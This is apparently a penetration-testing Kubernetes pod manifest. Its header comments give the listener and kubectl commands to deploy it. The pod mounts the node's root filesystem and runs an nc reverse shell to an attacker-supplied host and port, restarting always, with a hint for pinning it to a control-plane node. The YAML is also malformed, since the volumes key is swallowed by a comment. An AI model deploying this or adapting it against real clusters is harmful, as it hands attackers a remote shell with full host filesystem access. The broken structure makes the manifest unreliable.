###########################################################
## Set up Listener: nc -nvlp 3116
## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < pod-hostpath.yaml-revshell.yaml | kubectl apply -f -
## Remove: kubectl -n [namespace] delete pod-hostpath-revshell
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostpath-revshell
  labels:
    app: pentest
spec:
  containers:
  - name: hostpath-revshell
    image: busybox
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  volumes:
    restartPolicy: Always
  - name: noderoot
    hostPath:
      path: /